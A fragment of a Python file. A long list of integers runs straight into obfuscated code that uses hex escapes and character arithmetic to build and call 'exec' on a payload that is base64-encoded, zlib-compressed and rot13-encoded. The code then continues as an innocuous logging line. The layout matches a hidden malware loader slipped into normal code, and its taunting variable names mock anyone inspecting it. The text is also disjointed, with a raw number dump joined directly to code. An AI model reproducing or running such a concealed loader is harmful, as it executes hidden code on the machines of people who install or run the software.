6212658 6166328 5037850 7088140 89080 2665299 9719915 11920920 8955970 163995 576706 283176 3952332 6138720 8659980 10319940 3459800 1280676 161860 51870 2435250 6931656 3196522 1527030 341905 7265895 9809455 5280688 6588183 1684008 10751112 3620735 3711935 2101440 809948 7445910 7656305 6875824 7874685 7469960 4394725 5493528 3843530 1205130 2690707 1967374 2228611 1179175 1150372 171600 701454 4804904 669900 5363840 4755408 11124985 3124634 2961893 2837437 10306240 6771644 3092793 3541328 182988 7504380 2047000 2964060 3378704 8487488 7190998 3697158 1008513 9005208 7376139 3927743 9552368 2742597 5133926 6206652 2311680 3009798 833028 10506608 3530296 4332300 1356850 2624527 2751793 2669733 2394070 3060196 9653172 845520 3047668 1129650 1732414 1747310 6141852 3553786 8646840 10742180 287180 1469024 8047488 11999933 3563346 859220 420224 1719072 288032 236160 8018628 6755070 3157506 9098557 82624 8832714 3347765 2617768 861504 1658215 5273592 2594072 661024 902160 6018871 5059712 9333546 5543478 10761204 2640896 8903453 1575480 7633185 2561625 10578968 1218540 2351744 2321307 6116045 1633408 7015763 5559960 703580 194336 3119584 275968 733760 8284032 10978086 2905647 3348153 823648 7268835 6811105 2865536 6322155 8007685 196784 7085907 1614012 2185672 1955680 2770597 3622466 1278320 2700033 3743630 6963888 713088 5437432 1507305 2370048 8338983 4488036 4277988 9789636 9784072 5294239 4570980 2052020 2932737 873420 692064 2712832 1440256 493184 2269836 5935947 2087019 3347070 9042473 2466925 1163640 715299 5119400 61600 6803360 3070472 3586505 7106652 2033070 3448770 1332254 3203700 10746064 3431176 5216964 6666840 4895988 1158993 1447466 1891930 7078112 6234472 5222771 3231394 5588080 4378418 11000396 10886880 8793728 1153926 5624706 10051328 4147000 877546 3422952 2137083 9117108 160089 559164 5589552 1199496 4719258 5596015 6874390 2490348 1775612 1560720 4793584 715768 4420870 1858864 1768731 6089081 782892 9675759 443322 3954581 1434120 5588080 7513732 9453620 9258872 2909040 2799450 94254 10129700 9949920 11461032 497182 218660 779670 2491648 2679584 494368 352064 4780650 2815914 294496 7500159 7957680 3969000 180320 2806720 695360 4723901 2923730 6454392 9958698 3237507 9151509 4419136 548540 636352 2456512 1158016 760864 1530048 1579104 2585568 430784 2442792 6334013 8462433 5897208 1869828 4518740 3117160 5861968 1116906 2769468 816450 2827072 1415232 1191040 2284736 8500463 5873256 4862550 8653986 474048 4160392 11480880 2319080 5977776 4726700 1302857 2626355 2011353 6087816 4281612 7839 8072324 1344846 941040 376416 1535392 25216 1638144 940672 908128 1618464 2692032 10648056 9403706 9440490 4338990 8526326 10022230 3095680 5052656 1556850 3580776 899200 322624 1953120 70272 295072 4593225 1466046 1091200 6202410 2524200 3669480 7108528 2021742 3980813 775188 2749880 879060 7325537 2466936 3110290 5079795 2893968 18560 2327936 929024 2551104 2492384 250208 2255232 2757472 1236384 1442994 8935815 6523840 4058288 758816 5608275 159264 4936678 7766440 635360 3872280 3241388 98154 46120 2160368 1370625 2638555 1671604 1677458 10174381 1842902 2885703 1477056 2982847 11056675 3048096 4126658 5386576 8473294 255852 9015797 5719266 523215 5380544 7602876 3131200 3952665 5033820 6584982 3005160 3080910 7898256 1513884 2341428 858130 2530240 1594784 2112896 2613536 9160801 10402320 9666407 2264229 3761800 3583302 3224816 6873656 7062880 2358440 1934464 2074850 443128 2641596 11325900 7407946 5716016 5132800 3202520 2705549 2412399 473240 41376 1962080 2383136 2582624 116230 8708018 5645880 6635178 8949913 7043904 9106580 3237618 801350 193792 558464 1907744 2121536 7285534 6910080 4454403 7914654 3865800 9856668 3906900 1701828 590760 464890';why,are,you,reading,this,thing,huh="\x5f\x5f\x5f\x5f","\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f","\x28\x22\x22\x2e\x6a\x6f","\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c","\x31\x30\x31\x2c\x39\x39","\x5f\x5f\x29\x29","\x5d\x29\x29\x28\x5f\x28";b='eJxzdK8wccz1A+IwYyBt6OheketYHmYKAFuyB3k=';____("".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\x5f\x5f\x5f\x5f\x28\x22\x22\x2e\x6a\x6f\x69\x6e\x28\x63\x68\x72\x28\x69\x29\x20\x66\x6f\x72\x20\x69\x20\x69\x6e\x20\x5b\x31\x30\x31\x2c\x31\x32\x30\x2c\x31\x30\x31\x2c\x39\x39\x5d\x29\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=")).decode(),"".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')
                

        
        Logger.info("Process ended")
